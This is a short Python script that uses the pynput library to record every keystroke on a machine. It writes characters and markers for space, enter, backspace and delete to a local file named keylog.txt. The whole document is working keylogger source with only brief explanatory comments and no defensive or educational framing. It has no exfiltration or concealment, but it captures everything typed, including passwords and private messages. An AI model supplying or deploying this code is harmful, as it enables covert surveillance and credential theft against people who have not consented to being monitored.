from pynput.keyboard import Key, Listener

# Function to write keystrokes to a log file
def on_press(key):
    with open("keylog.txt", "a") as f:
        if hasattr(key, 'char'):  # Check if the pressed key has a character attribute
            f.write(key.char)
        elif key == Key.space:  # Replace space key with a whitespace character
            f.write(' ')
        elif key == Key.enter:  # Record a new line for the enter key
            f.write('\n')
        elif key == Key.backspace:  # Record a backspace character for backspace key
            f.write('[BACKSPACE]')
        elif key == Key.delete:  # Record a delete character for delete key
            f.write('[DELETE]')

# Start listening for keypress events
with Listener(on_press=on_press) as listener:
    listener.join()

